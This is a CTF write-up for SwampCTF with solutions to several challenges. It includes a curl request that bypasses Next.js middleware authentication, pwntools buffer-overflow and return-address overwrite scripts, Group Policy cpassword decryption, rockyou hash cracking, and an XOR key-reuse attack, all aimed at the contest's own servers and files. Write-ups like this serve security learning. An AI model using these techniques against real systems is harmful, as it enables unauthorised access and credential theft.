* * *
### CTF: **SwampCTF**
* * *

![image](https://github.com/user-attachments/assets/e85ba37f-462c-4762-9886-468bf675e5ea)


--------------------------------

### Challenges

- Web:
  - Serialies
  - SlowAPI 

- Pwn:
  - Beginner Pwn 1
  - Beginner Pwn 2

- Misc:
  - Lost In Translation 
    
- Forensics:
  - Preferential Treatment

- Osint:
  - Party Time! 
  - Party Time! Level 2 

- Crypto:
  - Rock my Password 
  - Intercepted communications
  
--------------------------------
   
### Web:

### Challenge: Serialies
![image](https://github.com/user-attachments/assets/64b27c27-c8b1-4d4a-8e72-2859105706a7)

After I Download the file ```serialies.zip```
In the PersonController.java file, we find the /api/person endpoint. Navigating there gives us the flag.

![image](https://github.com/user-attachments/assets/9bf8ffdd-7fa3-44e9-80a8-df9f40389e33)
swampCTF{f1l3_r34d_4nd_d3s3r14l1z3_pwn4g3_x7q9z2r5v8}

--------------------------------


### Challenge: SlowAPI 
![image](https://github.com/user-attachments/assets/7639e47e-e6fb-4373-9cc0-c5fc4bfc6e2d)

- IT The RECENT NEXT.JS VULNERABILITY!!!!
- ```curl -H "x-middleware-subrequest: middleware" http://chals.swampctf.com:43611/api/protected/flag```
      
--------------------------------


### PWN:

### Challenge: Beginner Pwn 1
![image](https://github.com/user-attachments/assets/708c2055-022e-4c34-a702-e39f67354b5a)

- Solve script
```python
from pwn import *

# Set up connection to the challenge server
HOST = "chals.swampctf.com"
PORT = 40004

# Buffer overflow payload
payload = b"A" * 10 + b"\x01\x00\x00\x00"  # Overwrite is_admin to 1 (true)

# Start interaction
p = remote(HOST, PORT)
p.recvuntil(b"please enter your name: ")
p.sendline(payload)

# Read output to check if admin
print(p.recv().decode())

# Send "y" to print flag
p.sendline(b"y")

# Receive and print flag
print(p.recvall().decode())

# Close connection
p.close()
```
- flag: swampCTF{n0t_@11_5t@ck5_gr0w_d0wn}

### Challenge: Beginner Pwn 2
![image](https://github.com/user-attachments/assets/cc125998-d69a-423d-b5e8-3bdd7eebf32e)

- Solve Script
```#!/usr/bin/env python3
from pwn import *

# Set up the target
HOST = 'chals.swampctf.com'
PORT = 40001

# Decide whether to run locally or remotely
local = False
if local:
    p = process('./binary')
else:
    p = remote(HOST, PORT)

# Address of the win function
win_addr = 0x401186  # The address of the win function from the disassembly

# Crafting the payload
# The structure of the stack:
# | local_12 (8 bytes) | local_a (2 bytes) | saved rbp (8 bytes) | return address (8 bytes) |

# We need to overflow local_12 and local_a (10 bytes total)
# Then the saved rbp (8 bytes)
# Then place our win function address as the return address
payload = b'A' * 10  # Fill the local_12 and local_a buffers
payload += b'B' * 8   # Overwrite the saved RBP
payload += p64(win_addr)  # Overwrite the return address with win() function address

# Send the payload
p.sendline(payload)

# Get the response without decoding (to avoid UTF-8 errors)
try:
    # Try to receive all data and print it
    print(p.recvall())
    
    # Alternatively, try to decode with error handling
    # print(p.recvall().decode('utf-8', errors='backslashreplace'))
except EOFError:
    print("Connection closed unexpectedly")
```
- Flag: swampCTF{1t5_t1m3_t0_r3turn!!}                                                     

--------------------------------

### MISC

### Challenge: Lost In Translation

![image](https://github.com/user-attachments/assets/32e32d6b-eee6-4494-8e1c-b35f7c53510a)

After i unzip the file, there is challenge.js and i Copy and paste the challenge.js to this whitespace "https://www.dcode.fr/whitespace-language"</a>
- Flag: swampCTF{Whit30ut_W0rk5_W0nd3r5} 




  
--------------------------------

### FORENSICS:

### Challenge: Preferential Treatment:
![image](https://github.com/user-attachments/assets/84ac06e1-0957-45a5-ab7b-3c04a9dbc6b6)
- when checking the pcap following the tcp you can see the following:
"<Groups clsid="{3125E937-EC16-4b4c-9934-544FC6D24D26}">
    <User clsid="{DF5F1855-52E5-4d24-8B1A-D9BDE98BA1D1}" name="swampctf.com\Administrator" image="2"
          changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">
        <Properties action="U" newName="" fullName="" description=""
                    cpassword="dAw7VQvfj9rs53A8t4PudTVf85Ca5cmC1Xjx6TpI/cS8WD4D8DXbKiWIZslihdJw3Rf+ijboX7FgLW7pF0K6x7dfhQ8gxLq34ENGjN8eTOI="
                    changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="swampctf.com\Administrator"/>
    </User>
</Groups>"
- then I looked up what that was and realized it was a weakly encrypted password
- so I found a repo to decrypt it.
"https://github.com/t0thkr1s/gpp-decrypt"
```
gpp-decrypt "dAw7VQvfj9rs53A8t4PudTVf85Ca5cmC1Xjx6TpI/cS8WD4D8DXbKiWIZslihdJw3Rf+ijboX7FgLW7pF0K6x7dfhQ8gxLq34ENGjN8eTOI="
```
- Flag: swampCTF{4v3r463_w1nd0w5_53cur17y}



--------------------------------


### OSINT      

### Challenge: Party Time! 
![image](https://github.com/user-attachments/assets/f3f16896-d45f-461a-9c41-b047cb34c697)
Use exiftool to find coords, simply input deg,', '' as xx.xx.xx,xx.xx.xx
![image](https://github.com/user-attachments/assets/ca7174b9-adf7-44a5-9ed0-ebc6ac59cdab)
- Flag: swampCTF{29.65,-82.33}



### Challenge: Party Time! Level 2
![image](https://github.com/user-attachments/assets/dcd2698c-1dd1-479b-b215-517fa5dec4f3)
"https://www.google.com/maps/reviews/@29.6523198,-82.3340688,17z/data=!3m1!4b1!4m6!14m5!1m4!2m3!1sChZDSUhNMG9nS0VJQ0FnTUR3emJxZE5BEAE!2m1!1s0x0:0x251c2b6555c0f535?entry=ttu&g_ep=EgoyMDI1MDMyNS4xIKXMDSoASAFQAw%3D%3D"
- Flag: swampCTF{Checkers_Yum}



--------------------------------

### CRYPTO:

### Challenge: Rock my Password 
![image](https://github.com/user-attachments/assets/bba615e3-4145-4d6d-9129-5a296d8598ba)
- Download rockyou.txt first from GitHub and insert it in your folder
```import hashlib

def md5_100(text):
    h = text.encode('utf-8')
    for _ in range(100):
        h = hashlib.md5(h).digest()
    return h

def sha256_100(h):
    for _ in range(100):
        h = hashlib.sha256(h).digest()
    return h

def sha512_100(h):
    for _ in range(100):
        h = hashlib.sha512(h).digest()
    return h

def hash_password(password):
    full_text = f"swampCTF{{{password}}}"
    h = md5_100(full_text)
    h = sha256_100(h)
    h = sha512_100(h)
    return h.hex()

target_hash = "f600d59a5cdd245a45297079299f2fcd811a8c5461d979f09b73d21b11fbb4f899389e588745c6a9af13749eebbdc2e72336cc57ccf90953e6f9096996a58dcc"

def rockyou_passwords():
    try:
        with open("rockyou.txt", "r", encoding="latin-1") as f:
            for line in f:
                yield line.strip()
    except FileNotFoundError:
        print("Error: rockyou.txt not found. Please create it first.")
        exit(1)

for password in rockyou_passwords():
    if hash_password(password) == target_hash:
        print(f"Found password: {password}")
        print(f"Flag: swampCTF{{{password}}}")
        break
```
- Flag: swampCTF{secretcode}                           

### Challenge: Intercepted communications
![image](https://github.com/user-attachments/assets/b84f48ac-de68-4af6-b0cd-dc8dd0cdf699)

-Solve Script 
```def read_binary_file(file_path):
    """Read binary data from a file and return as a binary string"""
    try:
        with open(file_path, 'r') as f:
            return f.read().strip()
    except Exception as e:
        print(f"Error reading {file_path}: {e}")
        return None

def xor_binary_strings(bin_str1, bin_str2):
    """XOR two binary strings and return the result as a binary string"""
    # Make sure both strings have the same length
    min_len = min(len(bin_str1), len(bin_str2))
    result = ''
    
    for i in range(min_len):
        bit1 = int(bin_str1[i])
        bit2 = int(bin_str2[i])
        xor_result = bit1 ^ bit2
        result += str(xor_result)
    
    return result

def binary_to_ascii(binary_str):
    """Convert a binary string to ASCII text"""
    # Split the binary string into 8-bit chunks
    bytes_list = [binary_str[i:i+8] for i in range(0, len(binary_str), 8)]
    
    # Convert each 8-bit chunk to its decimal value and then to an ASCII character
    ascii_text = ''
    for byte in bytes_list:
        if len(byte) == 8:  # Ensure we have a full byte
            decimal_value = int(byte, 2)
            ascii_text += chr(decimal_value)
    
    return ascii_text

def extract_keys():
    """Extract encryption keys from all message pairs"""
    keys = []
    
    for i in range(1, 6):  # M1 through M5
        encrypted = read_binary_file(f"M{i}/encrypted.txt")
        decrypted = read_binary_file(f"M{i}/decrypted.txt")
        
        if encrypted and decrypted:
            # XOR the encrypted and decrypted to get the key
            key = xor_binary_strings(encrypted, decrypted)
            keys.append((f"M{i}", key))
        else:
            print(f"Couldn't process M{i}")
    
    return keys

def analyze_keys(keys):
    """Analyze extracted keys to find patterns or reuse"""
    print("\nKey Analysis:")
    
    # Check for key reuse
    unique_keys = set(k[1] for k in keys)
    if len(unique_keys) < len(keys):
        print("Key reuse detected!")
    else:
        print("No direct key reuse detected, checking for patterns...")
    
    # Look for repeating patterns within keys
    for name, key in keys:
        repeating_segments = find_repeating_segments(key)
        if repeating_segments:
            print(f"{name} has repeating segments: {repeating_segments}")
    
    # Check for key cycling (where parts of keys are reused)
    key_lengths = [len(k[1]) for k in keys]
    if len(set(key_lengths)) == 1:
        print("All keys have the same length, checking for cycling...")
        check_key_cycling(keys)

def find_repeating_segments(key, min_segment_length=8):
    """Find repeating segments in a key"""
    repeating = []
    
    for segment_length in range(min_segment_length, len(key)//2):
        for i in range(len(key) - segment_length*2):
            segment = key[i:i+segment_length]
            rest_of_key = key[i+segment_length:]
            if segment in rest_of_key:
                repeating.append(segment)
                break
    
    return repeating[:5]  # Return just a few findings to avoid overwhelming output

def check_key_cycling(keys):
    """Check if keys are cycled versions of each other"""
    base_key = keys[0][1]
    
    for name, key in keys[1:]:
        for shift in range(1, len(base_key)):
            shifted_key = base_key[shift:] + base_key[:shift]
            if key.startswith(shifted_key[:100]):  # Check just the beginning for performance
                print(f"{name} appears to be a cyclic shift of the first key by {shift} positions")
                break

def decrypt_message(encrypted_message, keys):
    """Try to decrypt the important message using discovered keys and patterns"""
    attempts = []
    
    # Try each key directly
    for name, key in keys:
        if len(key) >= len(encrypted_message):
            decrypted_binary = xor_binary_strings(encrypted_message, key[:len(encrypted_message)])
            decrypted_text = binary_to_ascii(decrypted_binary)
            attempts.append((f"Using key from {name}", decrypted_text))
    
    # Try key extensions (repeating the key)
    for name, key in keys:
        extended_key = key * (len(encrypted_message) // len(key) + 1)
        decrypted_binary = xor_binary_strings(encrypted_message, extended_key[:len(encrypted_message)])
        decrypted_text = binary_to_ascii(decrypted_binary)
        attempts.append((f"Using extended key from {name}", decrypted_text))
    
    return attempts

def main():
    # Extract keys from message pairs
    print("Extracting keys from message pairs...")
    keys = extract_keys()
    
    # Analyze the extracted keys
    analyze_keys(keys)
    
    # Read the important captured message
    important_message = read_binary_file("Important_Message_Captured.txt")
    
    if important_message:
        print("\nAttempting to decrypt the important message...")
        decryption_attempts = decrypt_message(important_message, keys)
        
        print("\nDecryption Results:")
        for method, result in decryption_attempts:
            # Show only the first 100 characters of each result to avoid clutter
            preview = result[:100] + "..." if len(result) > 100 else result
            is_readable = all(32 <= ord(c) <= 126 or c in '\n\t\r' for c in result[:100])
            status = "✓ LOOKS READABLE" if is_readable else "✗ NOT READABLE"
            
            print(f"\n{method} ({status}):")
            print(preview)
            
            # If it looks readable, save it to a file
            if is_readable:
                output_file = "decrypted_important_message.txt"
                with open(output_file, 'w') as f:
                    f.write(result)
                print(f"\nFull decrypted message saved to {output_file}")
    else:
        print("Couldn't read the important message file.")

if __name__ == "__main__":
    main()
```
- I found the decrypted_important_message.txt file, and wrap we got the flag
- Flag: swampCTF{Nev3r_r3Use_a_0TP}




--------------------------------

Thanks for reading! Until next time :xD

* * *

